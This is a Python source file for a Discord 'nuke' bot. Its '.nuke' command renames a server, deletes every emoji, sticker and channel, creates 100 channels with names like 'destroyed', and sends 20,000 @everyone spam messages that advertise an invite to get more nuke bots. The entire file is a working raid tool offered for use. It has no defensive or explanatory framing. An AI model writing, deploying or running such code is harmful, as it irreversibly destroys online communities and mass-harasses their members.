import os
import asyncio
import discord
from discord.ext import commands
import random
import time

# --- CONFIGURE THESE ---
BOT_TOKEN = os.getenv("BOT_TOKEN")  # Read from Railway environment variable
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

PREFIX = "."

# Nuke Configuration
CHANNEL_NAME = "nuked"  # fallback
MESSAGE = """# NUKED BY N3XL 
N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
https://discord.gg/pbtxaTf8Q4
https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
||@everyone|| ||@here||"""
AMOUNT_OF_CHANNELS = 100
AMOUNT_OF_MESSAGES = 20000

RANDOM_CHANNEL_NAMES = [
    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
    "d̸e̸st̸r̸o̸y̸e̸d̸",
    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
    "dєstrσчєd",
    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
]

USE_RANDOM_NAMES = True

def get_channel_name():
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.emojis = True
intents.guild_stickers = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def send_messages_fast(channels, message, total):
    if not channels:
        return
    semaphore = asyncio.Semaphore(50)
    async def send_with_limit(channel, msg):
        async with semaphore:
            try:
                await channel.send(msg)
            except Exception:
                pass
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_with_limit(channel, message))
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    try:
        await guild.edit(name="<<[ TAMED BY N3XEL]>>")
        print("Server renamed.")
    except Exception as e:
        print(f"Failed to rename server: {e}")

    print("Deleting all emojis...")
    emoji_tasks = []
    for emoji in guild.emojis:
        try:
            emoji_tasks.append(emoji.delete())
        except Exception:
            pass
    if emoji_tasks:
        await asyncio.gather(*emoji_tasks, return_exceptions=True)

    print("Deleting all stickers...")
    sticker_tasks = []
    for sticker in guild.stickers:
        try:
            sticker_tasks.append(sticker.delete())
        except Exception:
            pass
    if sticker_tasks:
        await asyncio.gather(*sticker_tasks, return_exceptions=True)

    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_raid_channel():
        return await guild.create_text_channel(get_channel_name())
    channels = await asyncio.gather(
        *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )

    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} messages...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Command: {PREFIX}nuke")
    print("=" * 50)

@bot.command(name="nuke")
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ You need Administrator permission to use this command!")
        return
    await ctx.send("💣 Nuking server in progress...")
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    config_msg = f"""
**Current Configuration:**
📝 Channel Name: `{CHANNEL_NAME}`
🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
💬 Message: `{MESSAGE[:50]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages: `{AMOUNT_OF_MESSAGES}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
